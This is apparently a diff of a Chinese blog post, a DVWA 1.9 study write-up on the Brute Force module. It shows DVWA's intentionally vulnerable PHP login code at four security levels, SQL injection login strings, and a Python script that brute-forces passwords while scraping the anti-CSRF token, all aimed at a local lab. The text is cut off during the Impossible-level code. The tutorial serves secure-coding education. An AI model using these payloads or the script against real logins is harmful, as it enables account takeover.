@@ -6,19 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>各种鸡汤 | Python</title>
+  <title>DVWA-1.9总结学习 | Python</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="生活中最不幸的是:由于你身边缺乏积极进取的人，缺少远见卓识的人。使你的人生变得平平庸庸，黯然无光。 1、把时间分给靠谱的人和事。（感情真诚的人，做事实在的人。） 2、把周围的人过滤一遍，缩小朋友圈。（没有物质收获的，也没有精神收获的，不要浪费时间，时间去哪了，生命就去哪了。） 3、善于与人沟通，适度采纳别人意见。（采纳，接受，做事方法有多重，没有完美的途径，条条大路通罗马，不是关键的问题，可以试试">
-<meta name="keywords" content="闲谈">
+  <meta name="description" content="前言 目前在一家国内做安全的互联网公司工作，之前自己安全的意识不是特别的重要，现在写了几次项目之后，发现写的一些项目还是存在一些漏洞的，因此有必要再次复盘总结学习关于安全方面的知识。  使用DVWA来学习关于web开发中出现的一些漏洞，从而提高自己开发过程中对安全的意识和重视 DVWA的介绍 DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的P">
+<meta name="keywords" content="PHP,MySql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="各种鸡汤">
-<meta property="og:url" content="http://yoursite.com/2017/04/07/各种鸡汤/index.html">
+<meta property="og:title" content="DVWA-1.9总结学习">
+<meta property="og:url" content="http://yoursite.com/2017/09/02/dvwa学习总结/index.html">
 <meta property="og:site_name" content="Python">
-<meta property="og:description" content="生活中最不幸的是:由于你身边缺乏积极进取的人，缺少远见卓识的人。使你的人生变得平平庸庸，黯然无光。 1、把时间分给靠谱的人和事。（感情真诚的人，做事实在的人。） 2、把周围的人过滤一遍，缩小朋友圈。（没有物质收获的，也没有精神收获的，不要浪费时间，时间去哪了，生命就去哪了。） 3、善于与人沟通，适度采纳别人意见。（采纳，接受，做事方法有多重，没有完美的途径，条条大路通罗马，不是关键的问题，可以试试">
-<meta property="og:updated_time" content="2017-07-23T08:35:53.000Z">
+<meta property="og:description" content="前言 目前在一家国内做安全的互联网公司工作，之前自己安全的意识不是特别的重要，现在写了几次项目之后，发现写的一些项目还是存在一些漏洞的，因此有必要再次复盘总结学习关于安全方面的知识。  使用DVWA来学习关于web开发中出现的一些漏洞，从而提高自己开发过程中对安全的意识和重视 DVWA的介绍 DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的P">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001a146d26a.png">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001a71460ab.png">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001b656cf46.png">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001b656a875.png">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001dd6279cc.png">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001ea6b63be.png">
+<meta property="og:image" content="https://i.loli.net/2017/11/06/5a001ed03f4f4.png">
+<meta property="og:updated_time" content="2017-11-06T08:56:46.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="各种鸡汤">
-<meta name="twitter:description" content="生活中最不幸的是:由于你身边缺乏积极进取的人，缺少远见卓识的人。使你的人生变得平平庸庸，黯然无光。 1、把时间分给靠谱的人和事。（感情真诚的人，做事实在的人。） 2、把周围的人过滤一遍，缩小朋友圈。（没有物质收获的，也没有精神收获的，不要浪费时间，时间去哪了，生命就去哪了。） 3、善于与人沟通，适度采纳别人意见。（采纳，接受，做事方法有多重，没有完美的途径，条条大路通罗马，不是关键的问题，可以试试">
+<meta name="twitter:title" content="DVWA-1.9总结学习">
+<meta name="twitter:description" content="前言 目前在一家国内做安全的互联网公司工作，之前自己安全的意识不是特别的重要，现在写了几次项目之后，发现写的一些项目还是存在一些漏洞的，因此有必要再次复盘总结学习关于安全方面的知识。  使用DVWA来学习关于web开发中出现的一些漏洞，从而提高自己开发过程中对安全的意识和重视 DVWA的介绍 DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的P">
+<meta name="twitter:image" content="https://i.loli.net/2017/11/06/5a001a146d26a.png">
   
     <link rel="alternative" href="/atom.xml" title="Python" type="application/atom+xml">
   
@@ -149,20 +157,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-各种鸡汤" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-dvwa学习总结" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      各种鸡汤
+      DVWA-1.9总结学习
     </h1>
   
 
         
-        <a href="/2017/04/07/各种鸡汤/" class="archive-article-date">
-  	<time datetime="2017-04-07T15:54:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-07</time>
+        <a href="/2017/09/02/dvwa学习总结/" class="archive-article-date">
+  	<time datetime="2017-09-02T12:50:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-02</time>
 </a>
         
       </header>
@@ -171,28 +179,79 @@
       
 	
         <div id="toc" class="article-toc">
-          
+          <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA的介绍"><span class="toc-text">DVWA的介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Brute-Force的学习"><span class="toc-text">Brute Force的学习</span></a></li></ol>
           <hr/>
         </div>
         
-        <p>生活中最不幸的是:由于你身边缺乏积极进取的人，缺少远见卓识的人。使你的人生变得平平庸庸，黯然无光。</p>
-<p>1、把时间分给靠谱的人和事。（感情真诚的人，做事实在的人。）</p>
-<p>2、把周围的人过滤一遍，缩小朋友圈。（没有物质收获的，也没有精神收获的，不要浪费时间，时间去哪了，生命就去哪了。）</p>
-<p>3、善于与人沟通，适度采纳别人意见。（采纳，接受，做事方法有多重，没有完美的途径，条条大路通罗马，不是关键的问题，可以试试别人的建议的方法，加强信任。）</p>
-<p>4、与跟生命有关的人耗着，少与生命无关的事耗。（抓住生命中的重点，过客就一带而过吧。）</p>
-<p>5、多想什么是自己真正想要的东西，想不透就继续想。（明确目标，思考是成熟的第一要素，反复问自己要什么？）</p>
-<p>6、超过10个人的饭局尽量少参加。（吃完都不知道跟谁吃的。）</p>
-<p>7、与人为善，善于吃亏。（吃亏是福，吃亏要么聚福，要么减祸。）</p>
-<p>8、什么事情都可以拖一拖，没必要那么着急，事缓则圆。（想当下办，却不能当下办的，就不要催了，养和气，想办法，睿智处事。）</p>
-<p>9、杜绝事必躬亲，学会抓大放小。（一个人的时间是有限的，能授权就授权，同时把责任和目标说清楚，一旦需要躬亲时，借机会把事情做漂亮，树立好领导形象。）</p>
-<p>10、减少被别人利用的次数，学会减负。（被别人利用，对自己的好处在哪，一定要表现出来，哪怕不能直说，也要打下伏笔，让人们知道。）</p>
-<p>11、不要认为自己比别人做得好，即便你很出色。（要谦虚，人们的眼睛是雪亮的，如果争功，骄傲，势必受到攻击，不值。）</p>
-<p>12、减少蜗居时间，亲近大自然。（走呗，一起。）</p>
-<p>13、常问自己，谁对我有恩还没加倍报答。（该是谁的就是谁的，自己的成绩如果是别人帮忙给的，就主动报答，聚集自己的真正的朋友圈。）</p>
-<p>14、尽量减少与性格孤僻、心态扭曲的人接触。（近朱者赤，近墨者黑。</p>
-<p>15、经常笑，学会向比自己小的人称哥称姐，以保持年轻心态。(哥哥好，姐姐好。)</p>
-<p>16、常抬头看太阳，保持阳光心态、阳光思考、阳光做事、阳光生活！(心若向阳，何惧迷惘。)</p>
-<p>17、这辈子做优秀之人，所以努力勤劳是支撑点。（你若精彩，清风自来。）</p>
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><div id="title">前言</div></h4><blockquote>
+<p>目前在一家国内做安全的互联网公司工作，之前自己安全的意识不是特别的重要，现在写了几次项目之后，发现写的一些项目还是存在一些漏洞的，因此有必要再次复盘总结学习关于安全方面的知识。</p>
+</blockquote>
+<p><strong>使用DVWA来学习关于web开发中出现的一些漏洞，从而提高自己开发过程中对安全的意识和重视</strong></p>
+<h4 id="DVWA的介绍"><a href="#DVWA的介绍" class="headerlink" title="DVWA的介绍"></a><div id="title">DVWA的介绍</div></h4><blockquote>
+<p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
+<p>DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA（不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。</p>
+<p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2017/11/06/5a001a146d26a.png" alt="安全.png"></p>
+<h4 id="Brute-Force的学习"><a href="#Brute-Force的学习" class="headerlink" title="Brute Force的学习"></a><div id="title">Brute Force的学习</div></h4><blockquote>
+<p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2017/11/06/5a001a71460ab.png" alt="bruteforce.png"></p>
+<p><strong>下面对四种级别的代码进行分析</strong></p>
+<ul>
+<li>low</li>
+</ul>
+<p><strong>服务器端核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Login'</span>]))&#123;</div><div class="line"><span class="comment">//Getusername</span></div><div class="line">$user=$_GET[<span class="string">'username'</span>];</div><div class="line"></div><div class="line"><span class="comment">//Getpassword</span></div><div class="line">$pass=$_GET[<span class="string">'password'</span>];</div><div class="line">$pass=md5($pass);</div><div class="line"></div><div class="line"><span class="comment">//Checkthedatabase</span></div><div class="line">$query=<span class="string">"SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"</span>;</div><div class="line">$result=mysql_query($query)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($result&amp;&amp;mysql_num_rows($result)==<span class="number">1</span>)&#123;</div><div class="line"><span class="comment">//Getusersdetails</span></div><div class="line">$avatar=mysql_result($result,<span class="number">0</span>,<span class="string">"avatar"</span>);</div><div class="line"></div><div class="line"><span class="comment">//Loginsuccessful</span></div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="comment">//Loginfailed</span></div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mysql_close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。</p>
+<p><strong>漏洞利用</strong></p>
+<blockquote>
+<p>使用手工注入sql的方法</p>
+</blockquote>
+<p><strong>第一种方式</strong></p>
+<p>Username:admin’ or ’1′=’1<br>  Password:（空）<br>  注入成功<br><img src="https://i.loli.net/2017/11/06/5a001b656cf46.png" alt="sql注入第一步.png"></p>
+<p><strong>第二种方式</strong></p>
+<p>Username :admin’ #</p>
+<p>Password :（空）</p>
+<p>注入成功</p>
+<p><img src="https://i.loli.net/2017/11/06/5a001b656a875.png" alt="sql注入第二部.png"></p>
+<ul>
+<li>meduim</li>
+</ul>
+<p><strong>服务端核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Login'</span>]))&#123;</div><div class="line"><span class="comment">//Sanitiseusernameinput</span></div><div class="line">$user=$_GET[<span class="string">'username'</span>];</div><div class="line">$user=mysql_real_escape_string($user);</div><div class="line"></div><div class="line"><span class="comment">//Sanitisepasswordinput</span></div><div class="line">$pass=$_GET[<span class="string">'password'</span>];</div><div class="line">$pass=mysql_real_escape_string($pass);</div><div class="line">$pass=md5($pass);</div><div class="line"></div><div class="line"><span class="comment">//Checkthedatabase</span></div><div class="line">$query=<span class="string">"SELECT * FROM `users` WHERE user='$user' AND password='$pass'; "</span>;</div><div class="line">$result=mysql_query($query)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($result&amp;&amp;mysql_num_rows($result)==<span class="number">1</span>)&#123;</div><div class="line"><span class="comment">//Getusersdetails</span></div><div class="line">$avatar=mysql_result($result,<span class="number">0</span>,<span class="string">"avatar"</span>);</div><div class="line"></div><div class="line"><span class="comment">//Loginsuccessful</span></div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="comment">//Loginfailed</span></div><div class="line">sleep(<span class="number">2</span>);</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mysql_close();</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<blockquote>
+<p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，但是因为 MySQL5.5.37以下版本如果设置编码为GBK，就能够构造编码绕过<code>mysql_real_escape_string</code> 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，<code>$pass</code>做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）</p>
+</blockquote>
+<p><strong>漏洞利用</strong></p>
+<p>虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了</p>
+<ul>
+<li>high</li>
+</ul>
+<p><strong>服务器端核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Login'</span>]))&#123;</div><div class="line"><span class="comment">//CheckAnti-CSRFtoken</span></div><div class="line">checkToken($_REQUEST[<span class="string">'user_token'</span>],$_SESSION[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</div><div class="line"></div><div class="line"><span class="comment">//Sanitiseusernameinput</span></div><div class="line">$user=$_GET[<span class="string">'username'</span>];</div><div class="line">$user=stripslashes($user);</div><div class="line">$user=mysql_real_escape_string($user);</div><div class="line"></div><div class="line"><span class="comment">//Sanitisepasswordinput</span></div><div class="line">$pass=$_GET[<span class="string">'password'</span>];</div><div class="line">$pass=stripslashes($pass);</div><div class="line">$pass=mysql_real_escape_string($pass);</div><div class="line">$pass=md5($pass);</div><div class="line"></div><div class="line"><span class="comment">//Checkdatabase</span></div><div class="line">$query=<span class="string">"SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"</span>;</div><div class="line">$result=mysql_query($query)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($result&amp;&amp;mysql_num_rows($result)==<span class="number">1</span>)&#123;</div><div class="line"><span class="comment">//Getusersdetails</span></div><div class="line">$avatar=mysql_result($result,<span class="number">0</span>,<span class="string">"avatar"</span>);</div><div class="line"></div><div class="line"><span class="comment">//Loginsuccessful</span></div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="comment">//Loginfailed</span></div><div class="line">sleep(rand(<span class="number">0</span>,<span class="number">3</span>));</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mysql_close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//GenerateAnti-CSRFtoken</span></div><div class="line">generateSessionToken();</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。</strong></p>
+<p><strong>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</strong></p>
+<p><img src="https://i.loli.net/2017/11/06/5a001dd6279cc.png" alt="token提交.png"></p>
+<p>同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
+<p><strong>漏洞利用</strong></p>
+<p>由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧</p>
+<p>下面是我自己写的一个脚本（python 2.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">header=&#123;        <span class="string">'Host'</span>: <span class="string">'192.168.153.130'</span>,</div><div class="line">		<span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</div><div class="line">		<span class="string">'If-None-Match'</span>: <span class="string">"307-52156c6a290c0"</span>,</div><div class="line">		<span class="string">'If-Modified-Since'</span>: <span class="string">'Mon, 05 Oct 2015 07:51:07 GMT'</span>,</div><div class="line">		<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>,</div><div class="line">		<span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</div><div class="line">		<span class="string">'Referer'</span>: <span class="string">'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php'</span>,</div><div class="line">		<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</div><div class="line">		<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</div><div class="line">		<span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'</span>&#125;</div><div class="line">requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></div><div class="line">	req = urllib2.Request(url=requrl,headers=header)</div><div class="line">	response = urllib2.urlopen(req)</div><div class="line">	<span class="keyword">print</span> response.getcode(),</div><div class="line">	the_page = response.read()</div><div class="line">	<span class="keyword">print</span> len(the_page)</div><div class="line">	soup = BeautifulSoup(the_page,<span class="string">"html.parser"</span>)</div><div class="line">	user_token = soup.form.input.input.input.input[<span class="string">"value"</span>] <span class="comment">#get the user_token</span></div><div class="line">	<span class="keyword">return</span> user_token</div><div class="line"></div><div class="line">user_token = get_token(requrl,header)</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"rkolin.txt"</span>):</div><div class="line">	requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span>+<span class="string">"?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</div><div class="line">	i = i+<span class="number">1</span></div><div class="line">	<span class="keyword">print</span> i,<span class="string">'admin'</span>,line.strip(),</div><div class="line">	user_token = get_token(requrl,header)</div><div class="line">	<span class="keyword">if</span> (i == <span class="number">10</span>):</div><div class="line">		<span class="keyword">break</span></div></pre></td></tr></table></figure>
+<p>get_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，为了方便展示，这里设置只尝试10次。</p>
+<p>运行脚本时的Burpsuite截图</p>
+<p><img src="https://i.loli.net/2017/11/06/5a001ea6b63be.png" alt="bs4token.png"></p>
+<p>打印的结果从第二行开始依次是序号、用户名、密码、http状态码以及返回的页面长度。</p>
+<p><img src="https://i.loli.net/2017/11/06/5a001ed03f4f4.png" alt="result.png"></p>
+<p>对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。</p>
+<ul>
+<li>Impossible</li>
+</ul>
+<p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Login'</span>]))&#123;</div><div class="line"><span class="comment">//CheckAnti-CSRFtoken</span></div><div class="line">checkToken($_REQUEST[<span class="string">'user_token'</span>],$_SESSION[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</div><div class="line"></div><div class="line"><span class="comment">//Sanitiseusernameinput</span></div><div class="line">$user=$_POST[<span class="string">'username'</span>];</div><div class="line">$user=stripslashes($user);</div><div class="line">$user=mysql_real_escape_string($user);</div><div class="line"></div><div class="line"><span class="comment">//Sanitisepasswordinput</span></div><div class="line">$pass=$_POST[<span class="string">'password'</span>];</div><div class="line">$pass=stripslashes($pass);</div><div class="line">$pass=mysql_real_escape_string($pass);</div><div class="line">$pass=md5($pass);</div><div class="line"></div><div class="line"><span class="comment">//Defaultvalues</span></div><div class="line">$total_failed_login=<span class="number">3</span>;</div><div class="line">$lockout_time=<span class="number">15</span>;</div><div class="line">$account_locked=<span class="keyword">false</span>;</div><div class="line"></div><div class="line"><span class="comment">//Checkthedatabase(Checkuserinformation)</span></div><div class="line">$data=$db-&gt;prepare(<span class="string">'SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;'</span>);</div><div class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</div><div class="line">$data-&gt;execute();</div><div class="line">$row=$data-&gt;fetch();</div><div class="line"></div><div class="line"><span class="comment">//Checktoseeiftheuserhasbeenlockedout.</span></div><div class="line"><span class="keyword">if</span>(($data-&gt;rowCount()==<span class="number">1</span>)&amp;&amp;($row[<span class="string">'failed_login'</span>]&gt;=$total_failed_login))&#123;</div><div class="line"><span class="comment">//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!</span></div><div class="line"><span class="comment">//echo"&lt;pre&gt;&lt;br/&gt;Thisaccounthasbeenlockedduetotoomanyincorrectlogins.&lt;/pre&gt;";</span></div><div class="line"></div><div class="line"><span class="comment">//Calculatewhentheuserwouldbeallowedtologinagain</span></div><div class="line">$last_login=$row[<span class="string">'last_login'</span>];</div><div class="line">$last_login=strtotime($last_login);</div><div class="line">$timeout=strtotime(<span class="string">"&#123;$last_login&#125;+&#123;$lockout_time&#125;minutes"</span>);</div><div class="line">$timenow=strtotime(<span class="string">"now"</span>);</div><div class="line"></div><div class="line"><span class="comment">//Checktoseeifenoughtimehaspassed,ifithasn'tlockedtheaccount</span></div><div class="line"><span class="keyword">if</span>($timenow&gt;$timeout)</div><div class="line">$account_locked=<span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Checkthedatabase(ifusernamematchesthepassword)</span></div><div class="line">$data=$db-&gt;prepare(<span class="string">'SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;'</span>);</div><div 